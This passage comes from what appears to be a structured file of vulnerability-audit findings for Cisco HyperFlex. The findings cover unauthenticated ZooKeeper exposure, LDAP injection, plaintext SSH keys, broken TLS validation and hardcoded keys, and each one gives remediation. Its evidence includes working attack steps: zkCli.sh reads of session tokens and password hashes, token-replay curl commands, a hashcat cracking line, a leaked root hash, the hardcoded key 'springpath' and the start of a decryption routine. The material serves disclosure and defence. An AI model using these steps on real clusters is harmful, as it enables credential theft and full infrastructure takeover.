                "zkCredsKey from cfg 'sysmgmt.stSSOMgr.zkCredsKey'. "
                "getHypervHostCreds(): reads ZkPersistenceManager.read(zkAuthKey, zkCredsKey) -> decrypts."
            ),
            "attack_path": (
                "ZK read at port 2181 (no auth, world:anyone:cdrwa). "
                "Step 1: read node <zkAuthKey>/<zkEncryptionKey> -> Base64 SecretKey. "
                "Step 2: read node <zkAuthKey>/<zkCredsKey> -> encrypted Hyper-V host creds. "
                "Step 3: Base64.decode(key), construct SecretKeySpec, decrypt creds. "
                "Result: plaintext Hyper-V hypervisor host credentials."
            ),
            "scope": (
                "Affects Hyper-V deployments of HyperFlex (non-VMware). "
                "Hyper-V host credentials are Windows local/domain admin credentials "
                "for the hypervisor nodes in the HyperFlex cluster. "
                "ESXi credential encryption path (EsxAuthZKMgmtImpl/ZKNodeService_StMgr) is separate; "
                "its encryption key source is unconfirmed — see HX-F104 encryption caveat."
            ),
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Do not store the symmetric encryption key in the same unauthenticated ZK as the ciphertext. "
            "Use a key derivation path external to ZK (e.g., derived from a hardware secret, "
            "sealed by a TPM, or stored in a separate secret store). "
            "Enable ZK authentication (HX-F102/F103 remediation) as defense-in-depth. "
            "Restrict ZK port 2181 to localhost only. "
            "Rotate Hyper-V host credentials after any ZK exposure incident."
        ),
    },
    "HX-F107": {
        "title": (
            "LdapDriver.getAdUserPrincipal() Uses MessageFormat.format() Without LDAP Filter Escaping "
            "to Construct sAMAccountName Search Filter — LDAP Injection via Login Username"
        ),
        "severity": "HIGH",
        "cvss": "7.5",
        "cwe": "CWE-90",
        "component": (
            "com.springpath.hx.aaa.gateway.adAuthenticator.LdapDriver / getAdUserPrincipal() "
            "— Active Directory LDAP authentication gateway"
        ),
        "evidence": {
            "injection_site": (
                "getAdUserPrincipal() offset 37-53: "
                "MessageFormat.format('(&(objectCategory=user)(sAMAccountName={0}))', "
                "userContext.getUserAccountName()). "
                "No LDAP filter escaping applied to the username before substitution. "
                "LDAP metacharacters (*, (, ), \\, \\0) in the username are passed verbatim "
                "into the filter string."
            ),
            "correct_api": (
                "RFC 4515 requires special characters to be escaped before use in LDAP filters. "
                "The correct approach is LdapConnection.encodeFilterValue(username) or "
                "encodeForLDAP(username) before substitution. "
                "MessageFormat.format() performs no LDAP escaping."
            ),
            "bind_vs_search_paths": (
                "openLdapContext() at offset 64: LDAP bind uses getUserPrincipalName() (UPN form, user@domain). "
                "getAdUserPrincipal() at offset 46: LDAP search uses getUserAccountName() (sAMAccountName form). "
                "The bind and search inputs may derive from different parts of the username, "
                "allowing a valid bind with crafted sAMAccountName for the search filter."
            ),
            "impact": (
                "A domain user who authenticates successfully (LDAP bind with correct password) "
                "can supply a crafted sAMAccountName portion that manipulates the search filter. "
                "Filter injection can return a different user's directory object, "
                "yielding that user's DN and group memberships to the HyperFlex authorization layer. "
                "Example: sAMAccountName='*' -> filter '(&(objectCategory=user)(sAMAccountName=*)' "
                "returns the first AD object in enumeration order rather than the authenticated user. "
                "An attacker can obtain admin-group memberships of a HyperFlex admin user "
                "while authenticating with their own (non-admin) AD password."
            ),
            "second_filter": (
                "expandGroups() at constant pool #73: "
                "filter '(&(objectCategory=group)(cn={0}))' also uses MessageFormat.format(). "
                "Group CNs injected into this filter could enumerate arbitrary group objects."
            ),
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Replace MessageFormat.format() with parameterized LDAP search using "
            "SearchControls and a properly escaped filter. "
            "Use OWASP ESAPI's Encoder.encodeForLDAP() or javax.naming attribute-level binding "
            "instead of building filter strings with user input. "
            "Apply the same fix to the group CN filter in expandGroups()."
        ),
    },
    "HX-F108": {
        "title": (
            "ZKService_StNodeMgr Stores SSH Private Key in Plaintext in Unauthenticated ZooKeeper — "
            "ZK Payload Entry 'ssh_plain_text_private_key' Readable by Any ZK Client on Port 2181"
        ),
        "severity": "HIGH",
        "cvss": "8.1",
        "cwe": "CWE-312",
        "component": (
            "com.storvisor.sysmgmt.stNodeMgr.ZKService_StNodeMgr (Scala interface) / "
            "STR_PAYLOAD_ENTRY_SSH_PLAIN_TEXT_PRIVATE_KEY / getNodeEntry_SSHPlainTextPrivateKey() "
            "— StNodeMgr ZK key registry for inter-node SSH credentials"
        ),
        "evidence": {
            "plaintext_key_constant": (
                "ZKService_StNodeMgr.$init$() at offsets 17-19: "
                "ldc 'ssh_plain_text_private_key' -> "
                "_setter_$STR_PAYLOAD_ENTRY_SSH_PLAIN_TEXT_PRIVATE_KEY_$eq(). "
                "The ZK payload entry key for the plaintext SSH private key is 'ssh_plain_text_private_key'. "
                "This is stored under the per-node ZK payload path (nodeId-scoped ZKNodeEntry). "
                "Readable via ZK getData on the node's payload ZK path, "
                "no authentication required (ZK ACL world:anyone:cdrwa — HX-F100)."
            ),
            "dual_representation": (
                "ZKService_StNodeMgr exposes two parallel representations for SSH private keys: "
                "1) 'ssh_encrypted_private_key' via getNodeEntry_SSHEncryptedPrivateKey() "
                "2) 'ssh_plain_text_private_key' via getNodeEntry_SSHPlainTextPrivateKey(). "
                "The plaintext variant is a design choice, not a fallback. "
                "Both entries are registered in $init$ and are live ZK entries. "
                "Analogous plaintext/encrypted pairs exist for the public key: "
                "'ssh_plain_text_public_key' and 'ssh_encrypted_public_key'."
            ),
            "zk_acl_context": (
                "ZooKeeper instance at port 2181 has world:anyone:cdrwa ACL by default (HX-F100). "
                "No authentication is required to read any ZK node. "
                "An attacker on the management network with TCP access to port 2181 can "
                "enumerate all per-node ZK payload paths and extract the plaintext SSH private key "
                "for any cluster node. "
                "Typical ZK path pattern: <CLUSTER_ROOT>/nodes/<nodeId>/payload."
            ),
            "impact": (
                "Plaintext SSH private key for HyperFlex cluster nodes readable from unauthenticated ZK. "
                "These are the SSH keys used for inter-node management communication (stNodeMgr layer). "
                "An attacker obtaining a node's SSH private key can authenticate as that node "
                "to other cluster members, enabling lateral movement across all HyperFlex nodes "
                "without cluster credentials. "
                "Combined with ZK write access (world:anyone:cdrwa), attacker can also "
                "overwrite SSH keys to inject attacker-controlled keys for persistent access."
            ),
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Remove 'ssh_plain_text_private_key' ZK entries entirely. "
            "If plaintext keys are required transiently, delete the ZK node immediately after consumption. "
            "Only store SSH keys in the encrypted representation ('ssh_encrypted_private_key'). "
            "Enable ZK authentication (HX-F102/F103 remediation) to require credentials for ZK reads. "
            "Restrict ZK port 2181 to localhost-only or cluster-internal network segment. "
            "Rotate all cluster SSH keys after any ZK exposure incident."
        ),
    },
    "HX-F113": {
        "title": (
            "VC Plugin ThumbprintTrustManager Unconditionally Trusts All TLS Certificates "
            "— add-then-contains Logic Bug Makes checkServerTrusted a No-Op"
        ),
        "severity": "HIGH",
        "cvss": "7.4",
        "cwe": "CWE-295",
        "component": (
            "HyperFlex-VC-HTML-Plugin-2.2.0.zip / ciscohx-service.jar / "
            "com.ciscohx.vcplugin.service.utils.ssl.ThumbprintTrustManager"
        ),
        "evidence": {
            "broken_check_logic": (
                "ThumbprintTrustManager.checkThumbprint(X509Certificate): "
                "1. Computes SHA-1 thumbprint of presented cert. "
                "2. Calls _thumbprints.add(thumbprint) — unconditionally adds to trusted set. "
                "3. Calls _thumbprints.contains(thumbprint) — ALWAYS returns true (just added). "
                "4. If false branch (never reached): throws CertificateException. "
                "The add-before-contains pattern means any certificate is implicitly added to "
                "the trust set before being checked — no certificate is ever rejected. "
                "Functionally identical to returning void from checkServerTrusted."
            ),
            "bytecode_evidence": (
                "ThumbprintTrustManager.checkThumbprint bytecode: "
                "offset 0: getThumbprint() -> offset 5: _thumbprints.add(thumb) -> "
                "offset 14: pop -> offset 15: _thumbprints.add(thumb) [again] -> "
                "offset 24: ifne 47 -> offset 37: logger.error / throw CertificateException. "
                "The contains() check at line 24 is against the same set that was just mutated "
                "by add() — the check is always true."
            ),
            "trust_manager_hierarchy": (
                "TrustedService.getSSLSocketFactory() creates SSLContext('TLSv1.2') "
                "initialized with ThumbprintTrustManager. "
                "RestService.getConnection() calls TrustedService.getSSLSocketFactory() (offset 40) "
                "then sets a custom HostnameVerifier (RestService$1, anonymous inner class) "
                "on every outbound HTTPS connection to the HX cluster. "
                "All plugin-to-cluster REST calls (GET/POST/PUT/DELETE) use this TLS context."
            ),
            "scope": (
                "Every HTTPS connection from the vCenter plugin service (ciscohx-service.jar) "
                "to HyperFlex cluster REST APIs is affected: cluster info, datastores, nodes, "
                "snapshots, VMs, network config, licensing, iSCSI configuration. "
                "An attacker on the management network can MITM all plugin-to-cluster communication "
                "without any certificate credential."
            ),
            "session_cookie_exposure": (
                "RestService.setDefaultHeaders() adds 'X-SessionCookie: <value>' to all requests. "
                "MITM of plugin-to-cluster traffic exposes vCenter session cookies "
                "to the attacker."
            ),
            "related_tls_bypass": (
                "install_vc_plugin.py additionally uses "
                "requests.get(url, auth=('admin', admin_pass), verify=False) "
                "and ssl._create_unverified_context() — TLS bypass at the installer level as well."
            ),
        },
        "versions_affected": ["HyperFlex-VC-HTML-Plugin-2.2.0 (2.2.0)"],
        "remediation": (
            "Fix ThumbprintTrustManager.checkThumbprint: check set membership BEFORE adding. "
            "Replace: add(thumb); if not contains(thumb): throw. "
            "With: if not contains(thumb): log; throw. "
            "Only add thumbprints via the explicit setThumbprint() path from registered ServerInfo. "
            "Alternatively, validate against a CA-signed trust store rather than thumbprint pinning."
        ),
    },
    "HX-F114": {
        "title": (
            "VC Plugin Installer install_vc_plugin.py: Shell Injection via stcli-Supplied "
            "Management IP in get_server_thumbprint() — Credential Exposure via verify=False "
            "and AutoAddPolicy SSH MITM"
        ),
        "severity": "HIGH",
        "cvss": "7.8",
        "cwe": "CWE-78",
        "component": (
            "HyperFlex-VC-HTML-Plugin-2.2.0.zip / install_vc_plugin.py "
            "(plugin installer, run on stCtlVM)"
        ),
        "evidence": {
            "shell_injection_site": (
                "get_server_thumbprint(host): "
                "subprocess.Popen("
                "    'openssl s_client -connect %s:443 ... | openssl x509 ...' % (host), "
                "    shell=True, ...). "
                "The 'host' parameter comes from get_cluster_mgmt_ip() which executes: "
                "    Popen('stcli node list --summary | awk /mgmtClusterIp/ {print $2}', shell=True). "
                "stcli output is passed unsanitized into the second shell command. "
                "If an attacker controls ZooKeeper (world:anyone:cdrwa — HX-F100) "
                "they can poison the cluster management IP stored in ZK, causing stcli "
                "to return a crafted string containing shell metacharacters. "
                "The crafted string is then interpolated into the openssl shell command, "
                "achieving OS command execution under the plugin installer's user context."
            ),
            "chained_via_zk": (
                "HX-F100 (ZK ACL world:anyone:cdrwa) + HX-F114: "
                "ZK write access → poison mgmtClusterIp → stcli returns crafted IP → "
                "shell=True subprocess → arbitrary command execution on stCtlVM "
                "during plugin installation."
            ),
            "tls_verify_false": (
                "get_from_hx(admin_pass, url): requests.get(url, auth=('admin', admin_pass), verify=False). "
                "Called with HTTP (not HTTPS) URLs: "
                "  http://<HOST>/coreapi/v1/hypervisor/vcenter "
                "  http://<HOST>/coreapi/v1/hypervisor/controllervms. "
                "Admin password transmitted in HTTP Basic Auth over cleartext HTTP. "
                "Management network MITM recovers admin credentials without TLS interception."
            ),
            "ssh_mitm": (
                "check_connection() and copy_file() use "
                "paramiko.AutoAddPolicy() — accepts any SSH host key. "
                "Plugin ZIP is copied to all stCtlVMs as root via SFTP. "
                "Network MITM on plugin distribution installs malicious plugin on all nodes. "
                "Root SSH credentials transmitted over unverified SSH connection."
            ),
            "admin_pass_scope": (
                "ADMIN_PASS (storage controller admin password) is used as: "
                "  (1) HTTP Basic Auth credential for coreapi calls "
                "  (2) SSH password for stCtlVM plugin copy. "
                "Single credential loss via MITM provides both REST API and SSH access "
                "to all cluster controller VMs."
            ),
            "ssl_context_bypass": (
                "perform_vc_extension_task(): "
                "ssl._create_unverified_context() used for vCenter SmartConnect. "
                "vCenter SOAP API credentials transmitted over unverified TLS."
            ),
        },
        "versions_affected": ["HyperFlex-VC-HTML-Plugin-2.2.0 (install_vc_plugin.py)"],
        "remediation": (
            "get_server_thumbprint: use subprocess.Popen with list args (not shell=True). "
            "Validate host against IP address format before use in any command. "
            "get_from_hx: change URLs from http:// to https:// and set verify=True. "
            "copy_file: replace AutoAddPolicy with RejectPolicy + explicit known_hosts validation. "
            "Use ssl.create_default_context() for vCenter connection."
        ),
    },
}

HX_F120 = {
    "id": "HX-F120",
    "title": (
        "gateway-1.0.0.jar VcClient.getServiceInstance: ignoreCert=true Disables TLS "
        "Verification for vCenter Session Cookie Validation — ZK-Poisonable VC URL Enables MITM"
    ),
    "severity": "HIGH",
    "cvss": "7.4",
    "cwe": "CWE-295",
    "component": "storfs-mgmt gateway-1.0.0.jar (AAA service)",
    "versions_affected": "5.5.2b-43453 (confirmed); earlier versions expected",
    "description": (
        "The gateway Java AAA service uses VcClient.getServiceInstance() to validate every "
        "HX Connect REST API session cookie against vCenter. At bytecode offset 53, iconst_1 "
        "(true) is pushed as the ignoreCert argument to the vim25 ServiceInstance constructor: "
        "ServiceInstance(URL, sessionCookie, ignoreCert=true). This disables all TLS certificate "
        "validation for the VC connection used during session cookie verification. The VC URL is "
        "fetched from ZooKeeper via StMgrClient.getVCUrl(), making it poisonable via HX-F100. "
        "An attacker controlling ZK can redirect session cookie validation to a rogue vCenter, "
        "capture any session cookie presented during authentication, and forge HxSession objects "
        "with arbitrary username and role claims."
    ),
    "evidence": {
        "bytecode_proof": (
            "VcClient.getServiceInstance() private method:\n"
            "  offset 52: aload_1 (sessionCookie)\n"
            "  offset 53: iconst_1 (boolean true = ignoreCert)\n"
            "  offset 54: invokespecial ServiceInstance.<init>(URL, String, Z)\n"
            "vim25 SDK signature: ServiceInstance(URL url, String sessionStr, boolean ignoreCert)"
        ),
        "vc_url_from_zk": (
            "offset 10: invokevirtual StMgrClient.getVCUrl() — fetches VC URL from ZK via stMgr. "
            "ZK ACLs are world:anyone:cdrwa (HX-F100). URL appended with '/sdk' before use."
        ),
        "session_cookie_flow": (
            "validateSessionCookieAndFetchSessionInfo(String sessionCookie) -> "
            "getServiceInstance(sessionCookie) -> ServiceInstance(vcUrl+'/sdk', sessionCookie, true) -> "
            "getUserName(si) + getScopes(si) -> HxSession(username, scopes)"
        ),
        "cross_version": (
            "com.springpath.hx.aaa.gateway namespace (5.5.2b); same pattern expected in "
            "com.cisco.hx.aaa.gateway (6.0.2b). Distinct from HX-F113 (VC plugin) and "
            "HX-F115 (PAM SSO) — this is the gateway REST API authentication path."
        ),
        "chain": "HX-F100 -> poison ZK VC URL -> rogue vCenter -> intercept session cookies -> forge HxSession",
    },
}

HX_F125 = {
    "id": "HX-F125",
    "title": (
        "HyperFlex Witness OVA 1.1.3: Static root SHA-512 Hash Baked at Build Time; "
        "Non-VMware Firstboot Path Skips Password Replacement — SSH Root Login via Cracked Hash"
    ),
    "severity": "HIGH",
    "cvss": "8.1",
    "cwe": "CWE-259",
    "component": "HyperFlex Witness OVA 1.1.3 (Ubuntu 16.04.5 LTS, /etc/shadow, /usr/share/springpath/storfs-misc/firstboot.sh)",
    "versions_affected": "Witness OVA 1.1.3 (confirmed); earlier OVA versions expected",
    "description": (
        "The Witness OVA 1.1.3 disk image ships with a static root password hash baked into "
        "/etc/shadow at image build time. The hash (SHA-512, salt N.7KFx5x) carries a last-change "
        "date of epoch day 18137 (2019-08-24), approximately two years before the OVA was "
        "generated (2021-07-30). The same hash is present in all copies of this OVA version.\n\n"
        "firstboot.sh sets the root password from the OVF property "
        "hx.7root_password.Cisco_HX_Witness_Appliance on VMware deployments. "
        "Two failure modes leave the baked-in hash intact or introduce a separate weakness:\n\n"
        "1. Non-VMware hypervisors (KVM, Hyper-V, bare metal): the dmidecode check for 'VMware' "
        "fails, the function runs 'chage -d 0 root' and returns — the baked-in hash is "
        "unchanged. sshd_config has PermitRootLogin yes with default PasswordAuthentication, "
        "so a cracked hash enables SSH root login.\n\n"
        "2. Empty OVF property on VMware: 'passwd -d root' runs unconditionally before "
        "the OVF property value is read. If hx_7root_password_Cisco_HX_Witness_Appliance "
        "is empty, chpasswd is not called and set_user_creds returns 1. Root now has no "
        "password hash. pam_unix.so nullok_secure allows empty-password console login; "
        "PermitEmptyPasswords no blocks SSH. VMware console access suffices for root login."
    ),
    "evidence": {
        "shadow_hash": (
            "/etc/shadow:\n"
            "  root:$6$N.7KFx5x$rPpagnP9U3w7DYKJ2I/KzbAr5QvLzWKjjbzgbKx1myYSgXsD4k87OwquTpXRNhLfKS6GFdcA8.mGBduhdKH3g/:18137:0:99999:7:::\n"
            "  date 18137 = 2019-08-24 (epoch day); OVA tarball headers = 2021-07-30"
        ),
        "firstboot_non_vmware": (
            "firstboot.sh set_user_creds():\n"
            "  dmidecode --string system-product-name | grep -i VMware\n"
            "  if [ $? -ne 0 ]; then  # not VMware\n"
            "    chage -d 0 root     # forces expiry; hash NOT replaced\n"
            "    touch /var/.firstboot\n"
            "    return 0\n"
            "  fi"
        ),
        "firstboot_empty_ovf": (
            "firstboot.sh set_user_creds() VMware path:\n"
            "  passwd -d $USERNAME  # unconditionally deletes hash\n"
            "  ...\n"
            "  USER_PASS='${hx_7root_password_Cisco_HX_Witness_Appliance}'\n"
            "  if [ ! -z '$USER_PASS' ]; then\n"
            "    chpasswd --crypt-method SHA512\n"
            "  else\n"
            "    return 1  # passwd -d already ran; hash gone; chpasswd skipped\n"
            "  fi"
        ),
        "ssh_config": (
            "/etc/ssh/sshd_config:\n"
            "  PermitRootLogin yes\n"
            "  PermitEmptyPasswords no\n"
            "  #PasswordAuthentication yes (default = yes)\n"
            "=> Cracked hash enables SSH root login on non-VMware or hash-persisted deployments"
        ),
        "pam": (
            "/etc/pam.d/common-auth:\n"
            "  auth [success=1 default=ignore] pam_unix.so nullok_secure\n"
            "/etc/securetty: console, :0, :0.0, :0.1, :1\n"
            "=> Empty-password root login available on VMware console (not SSH)"
        ),
        "os_eol": (
            "Ubuntu 16.04.5 LTS: end-of-life April 2021. "
            "OVA generated July 2021 on already-EOL OS — no security updates available post-deploy."
        ),
    },
}

HX_F127 = {
    "id": "HX-F127",
    "title": (
        "HyperFlex HXDP 5.x/6.x: ZooKeeper /rest/aaa/session_table Stores All Active "
        "HX Connect Session Tokens; Readable Without Authentication via HX-F100 World ACL "
        "— Full Session Hijacking of Any Logged-In User"
    ),
    "severity": "HIGH",
    "cvss": "8.8",
    "cwe": "CWE-522",
    "component": (
        "HyperFlex HXDP 5.5.2b (storfs-mgmt, /opt/springpath/clearsession.py); "
        "ZooKeeper ensemble (clientPort 2181, world:anyone:cdrwa ACL via HX-F100)"
    ),
    "versions_affected": "HXDP 5.x, 6.x (confirmed in 5.5.2b extract); earlier versions expected",
    "description": (
        "HX Connect (the cluster management REST API) persists all active session tokens "
        "in the ZooKeeper ensemble at path /rest/aaa/session_table as a JSON structure "
        "keyed by access token with per-entry fields including userName and session metadata. "
        "The ZK namespace carries a world:anyone:cdrwa ACL (HX-F100) that grants "
        "unauthenticated read access to every node in the /rest/ subtree. Any host with "
        "network connectivity to ZooKeeper port 2181 can retrieve the complete session table "
        "without credentials, obtaining all active access tokens for all logged-in users.\n\n"
        "A retrieved token authenticates to HX Connect at the same privilege level as the "
        "original session: an admin session token grants full cluster management access "
        "(node add/remove, datastores, replication policy, firmware upgrade). Tokens "
        "remain valid until the legitimate session expires or clearsession.py is invoked.\n\n"
        "Secondary impact: ZK paths /rest/aaa/auth_window_size_in_mins and "
        "/rest/aaa/max_authentications_allowed_in_window (rate-limit parameters for the "
        "HX Connect authentication endpoint) are also in the world-writable /rest/ subtree. "
        "An unauthenticated attacker can write these nodes directly to disable the "
        "brute-force rate limiter before or instead of harvesting live sessions."
    ),
    "evidence": {
        "session_table_path": "/rest/aaa/session_table",
        "session_table_structure": (
            "# From clearsession.py (storfs-mgmt, opt/springpath/clearsession.py):\n"
            "AAASessionTablePath = '/rest/aaa/session_table'\n"
            "sessionTableJSON, version = getDataJSON(zk, AAASessionTablePath)\n"
            "sessionTable = JSONIntoDataConverter(sessionTableJSON)\n"
            "for accessToken, sessionInfo in list(sessionTable.items()):\n"
            "    if sessionInfo['userName'] == username:\n"
            "        del sessionTable[accessToken]\n"
            "# => session table is {accessToken: {userName: ..., ...}, ...}\n"
            "#    each key is a live HX Connect access token"
        ),
        "acl_chain": (
            "HX-F100: setAcls(['world:anyone:cdrwa'], '/') on ZK startup\n"
            "=> /rest/aaa/session_table inherits world:anyone:cdrwa\n"
            "=> unauthenticated zk.get('/rest/aaa/session_table') returns full token map"
        ),
        "rate_limit_paths": (
            "# From setaaalimits.py:\n"
            "AAA_RATE_LIMIT_AUTH_WINDOW_SIZE_IN_MINS_KEY = "
            "'/rest/aaa/auth_window_size_in_mins'\n"
            "AAA_RATE_LIMIT_AUTH_MAX_AUTHENTICATIONS_ALLOWED_IN_WINDOW_KEY = "
            "'/rest/aaa/max_authentications_allowed_in_window'\n"
            "# Both in /rest/ subtree -> world-writable via HX-F100\n"
            "# Write window=300, max_auths=999 to disable brute-force limiting"
        ),
        "exploit_primitive": (
            "# Harvest all sessions with kazoo or zkCli.sh:\n"
            "# zkCli.sh -server <hx-ctlvm>:2181 get /rest/aaa/session_table\n"
            "# => JSON returned; extract any accessToken value\n"
            "# curl -k -H 'hx-auth-token: <token>' "
            "https://<hx-ctlvm>/rest/clusters/local/summary"
        ),
        "write_auth_required": (
            "clearsession.py uses AuthenticatedZKClientManager for the write path "
            "(delete stale token). Reading the session table does not require write "
            "permission — world:anyone:cdrwa includes 'r' (read). "
            "Session hijacking requires only read access to /rest/aaa/session_table."
        ),
    },
}


HX_F128 = {
    "id": "HX-F128",
    "title": (
        "HyperFlex HXDP 5.x/6.x: ZooKeeper /user_credentials Path Stores SHA-256 crypt(3) "
        "Hashes for root, admin, and diag Accounts; Readable Without Authentication via "
        "HX-F100 World ACL — Offline Hash Cracking Yields OS Root and Admin Credentials"
    ),
    "severity": "CRITICAL",
    "cvss": "9.1",
    "cwe": "CWE-916",
    "component": (
        "HyperFlex HXDP 5.5.2b (hxSecuritySvcMgr-1.0, PasswordOperations, "
        "mkpasswd.sh, setpasswd.sh); ZooKeeper ensemble (world:anyone:cdrwa via HX-F100)"
    ),
    "versions_affected": "HXDP 5.x, 6.x (confirmed in 5.5.2b extract); earlier versions expected",
    "description": (
        "The hxSecuritySvcMgr daemon synchronizes operating system credentials for the "
        "root, admin, and diag accounts to ZooKeeper at path /user_credentials. The "
        "credential entry format is 'username:hash;' where the hash is a SHA-256 crypt(3) "
        "value (\\$5\\$...) generated by mkpasswd -m sha-256. Synchronization is enabled by "
        "default (syncEnabled = true) and covers all three accounts.\n\n"
        "The ZK namespace carries a world:anyone:cdrwa ACL (HX-F100). Any host with network "
        "access to ZooKeeper port 2181 can read /user_credentials without credentials, "
        "obtaining the SHA-256 crypt hashes for all three synchronized accounts. SHA-256 "
        "crypt (hashcat mode 7400) can be cracked on GPU hardware. The root hash grants "
        "OS root access via SSH or console (PermitRootLogin yes is the HXDP default). "
        "The admin hash grants full HX Connect cluster management API access.\n\n"
        "The credential sync feature is architecturally necessary: when admin changes the "
        "admin password via HX Connect, hxSecuritySvcMgr writes the new hash to ZK so all "
        "storage controller VMs in the cluster can apply it locally. The ZK read path "
        "exposes the current in-use credentials, not stale build-time values."
    ),
    "evidence": {
        "zk_path": "/user_credentials",
        "sync_config": (
            "# hxSecuritySvcMgr-1.0.jar embedded application.conf:\n"
            "password {\n"
            "  zkPath = '/user_credentials'\n"
            "  syncEnabled = true\n"
            "  syncAccounts = ['root', 'admin', 'diag']\n"
            "}"
        ),
        "credential_format": (
            "# Inferred from PasswordOperations.syncPwToZK + split(':', ';') parsing:\n"
            "# ZK value at /user_credentials:\n"
            "#   root:$5$<salt>$<sha256crypt>;admin:$5$<salt>$<sha256crypt>;diag:$5$<salt>$<sha256crypt>;\n"
            "# Generated by mkpasswd.sh (mkpasswd -m sha-256)"
        ),
        "hash_scripts": (
            "# mkpasswd.sh:\n"
            "echo ${1} | mkpasswd -m sha-256 -s\n\n"
            "# setpasswd.sh (chpasswd -e = pre-encrypted input):\n"
            "echo -e ${user}:${pass} | chpasswd -e"
        ),
        "acl_chain": (
            "HX-F100: setAcls(['world:anyone:cdrwa'], '/') on ZK startup\n"
            "=> /user_credentials inherits world:anyone:cdrwa\n"
            "=> zkCli.sh -server <hx-ctlvm>:2181 get /user_credentials returns all three hashes"
        ),
        "crack_path": (
            "hashcat -m 7400 /user_credentials.txt /usr/share/wordlists/rockyou.txt\n"
            "# mode 7400 = sha256crypt (\\$5\\$)\n"
            "# Root hash cracked -> SSH as root to all cluster nodes\n"
            "# Admin hash cracked -> curl -k -d '{user,pass}' https://<hx>/rest/auth/token"
        ),
    },
}


HX_F130 = {
    "id": "HX-F130",
    "title": (
        "HyperFlex HXDP 5.x/6.x: ZooKeeper /storvisor2/stCluster Stores AES/ECB-Encrypted "
        "ESXi, vCenter, and UCSM Credentials; Hardcoded Key 'springpath' Confirmed in "
        "EsxAuthZKMgmtImpl — Plaintext Full-Stack Infrastructure Credentials via ZK Read"
    ),
    "severity": "CRITICAL",
    "cvss": "9.8",
    "cwe": "CWE-321",
    "component": (
        "HyperFlex HXDP 5.5.2b (stMgr-1.0.jar, common-1.0.jar, hxSecuritySvcMgr-1.0.jar); "
        "ZooKeeper ensemble (clientPort 2181, world:anyone:cdrwa ACL via HX-F100)"
    ),
    "versions_affected": (
        "HXDP 5.x, 6.x (confirmed in 5.5.2b extract); all versions with ZK credential storage "
        "architecture (Springpath-era origin, stMgr compiled 2025-04-28)"
    ),
    "description": (
        "ZooKeeper node /storvisor2/stCluster holds a JSON payload managed by "
        "ZKNodeService_StMgr (DefaultZKPayloadNodeService subclass). The payload contains "
        "AES/ECB-encrypted credentials for all components in the HyperFlex management plane: "
        "ESXi host username/password, vCenter SSO URL + encrypted username/password, and "
        "Cisco UCS Manager hostname + encrypted username/password. "
        "The encryption key is the literal string 'springpath' — confirmed present in the "
        "EsxAuthZKMgmtImpl class constant pool (Utf8 entry between "
        "'Failed to initialize root esx credentials' and 'Successfully logged in to ESX node'). "
        "BasicEncryptionUtil applies AES/ECB/PKCS5Padding with SHA-256 key derivation from "
        "the caller-supplied string. Since the ZK ACL is world:anyone:cdrwa (HX-F100), "
        "any unauthenticated ZK client on port 2181 can read the payload and decrypt all "
        "credentials offline with a 10-line Python script. "
        "Scope: ESXi admin → direct hypervisor console on all cluster nodes. "
        "vCenter admin → VM inventory, snapshots, network, storage policy on the entire datacenter. "
        "UCSM admin → physical blade management, BMC/KVM console, fabric interconnect config."
    ),
    "evidence": {
        "zk_path": "/storvisor2/stCluster",
        "zk_path_derivation": (
            "ZKConstants$.BASE_PATH = '/storvisor2' (Utf8 in ZKConstants$.class, common-1.0.jar). "
            "ZKConstants$.SERVICE_NAME_MGR = 'stCluster'. "
            "DefaultZKPayloadNodeService builds path as BASE_PATH + '/' + SERVICE_NAME. "
            "Result: /storvisor2/stCluster."
        ),
        "credential_fields": {
            "esx_username": "AES/ECB encrypted ESXi host username (all cluster nodes share one account)",
            "esx_password": "AES/ECB encrypted ESXi host password",
            "url_vcenter_sso": "vCenter SSO endpoint URL (plaintext)",
            "url_vcenter_encrypted_user": "AES/ECB encrypted vCenter username",
            "url_vcenter_encrypted_password": "AES/ECB encrypted vCenter password",
            "ucsm_hostname": "Cisco UCS Manager hostname (plaintext)",
            "ucsm_user": "AES/ECB encrypted UCSM username",
            "ucsm_pwd": "AES/ECB encrypted UCSM password",
            "user_credentials": "OS account SHA-256 crypt hashes (see HX-F128)",
        },
        "field_name_source": (
            "ZKEntryConstants.class from common-1.0.jar Utf8 constant pool: "
            "  esx_username, esx_password "
            "  url_vcenter_sso, url_vcenter_encrypted_user, url_vcenter_encrypted_password "
            "  ucsm_hostname, ucsm_user, ucsm_pwd "
            "  user_credentials "
            "Field constant names: STR_PAYLOAD_ENTRY_ESX_ENCRYPTED_USER, "
            "STR_PAYLOAD_ENTRY_ESX_ENCRYPTED_PASSWORD, STR_PAYLOAD_ENTRY_URL_VCENTER_SSO, "
            "STR_PAYLOAD_ENTRY_URL_VCENTER_ENCRYPTED_USER, "
            "STR_PAYLOAD_ENTRY_URL_VCENTER_ENCRYPTED_PASSWORD, "
            "STR_PAYLOAD_ENTRY_UCSM_HOST, STR_PAYLOAD_ENTRY_UCSM_ENCRYPTED_USER, "
            "STR_PAYLOAD_ENTRY_UCSM_ENCRYPTED_PASSWORD."
        ),
        "aes_key_confirmation": (
            "EsxAuthZKMgmtImpl.class (stMgr-1.0.jar, compiled 2025-04-28) Utf8 constant pool:\n"
            "  #N  Utf8  springpath\n"
            "Position in pool: between 'Failed to initialize root esx credentials' "
            "and 'Successfully logged in to ESX node'. "
            "Methods that reference springpath: getEsxCredentialsFromZK, "
            "updateAndSaveRandomEsxPasswordToZK, initializeVirtPlatformNodeLoginFromRoot. "
            "Same 'springpath' literal appears as keyStorePass in hxSecuritySvcMgr "
            "syslog TLS config (HX-F129) — shared hardcoded string across two unrelated "
            "subsystems confirms it is a project-level constant."
        ),
        "encryption_primitive": (
            "BasicEncryptionUtil.class (hxSecuritySvcMgr-1.0.jar): "
            "  cipher = Cipher.getInstance('AES/ECB/PKCS5Padding'); "
            "  key = MessageDigest.getInstance('SHA-256').digest(keyStr.getBytes()); "
            "  secretKeySpec = new SecretKeySpec(key, 'AES'); "
            "  cipher.init(DECRYPT_MODE, secretKeySpec); "
            "  return cipher.doFinal(Base64.decode(encryptedData))."
        ),
        "decrypt_primitive": (
            "import hashlib, base64\n"
            "from Crypto.Cipher import AES\n"
            "\n"
            "def hxdp_decrypt(b64_ciphertext: str, key_str: str = 'springpath') -> str:\n"
